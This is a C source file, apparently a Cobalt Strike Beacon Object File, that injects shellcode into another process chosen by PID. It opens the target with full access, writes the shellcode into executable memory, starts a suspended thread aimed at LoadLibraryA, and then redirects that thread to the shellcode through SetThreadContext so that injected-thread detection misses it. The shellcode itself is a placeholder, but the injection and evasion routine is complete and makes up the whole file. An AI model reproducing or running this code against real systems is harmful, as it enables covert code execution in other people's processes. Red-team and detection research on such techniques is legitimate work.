// Chris Sikes
// 04/13/2021
// Credit to: XPN's SetThreadContext https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/
// Beacon Object file version
#include <windows.h>
#include "beacon.h"

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI WINBOOL WINAPI KERNEL32$SetThreadContext (HANDLE hThread, CONST CONTEXT *lpContext);
WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);
WINBASEAPI WINBOOL WINAPI KERNEL32$GetThreadContext (HANDLE hThread, LPCONTEXT lpContext);

void go(char * argc, int len)
{
	unsigned char shellcode[] = "<insert shellcode here>";
	datap	parser;
	BeaconDataParse(&parser, argc, len);
	DWORD pid = BeaconDataInt(&parser);
	char currentDir[MAX_PATH];
	SIZE_T bytesWritten = 0;
	HANDLE threadHandle;


	HANDLE Process_Handle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	PVOID Alloc = KERNEL32$VirtualAllocEx(Process_Handle, NULL, sizeof shellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
	KERNEL32$WriteProcessMemory(Process_Handle, Alloc, shellcode, sizeof shellcode, NULL);
	threadHandle = KERNEL32$CreateRemoteThread(Process_Handle, NULL, 0, (LPTHREAD_START_ROUTINE)_loadLibrary, NULL, CREATE_SUSPENDED, NULL);
	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_CONTROL;
	KERNEL32$GetThreadContext(threadHandle, &ctx);
	ctx.Rip = (DWORD64)Alloc;
	KERNEL32$SetThreadContext(threadHandle, &ctx);
	KERNEL32$ResumeThread(threadHandle);

	KERNEL32$CloseHandle(threadHandle);
	KERNEL32$CloseHandle(Process_Handle);

}
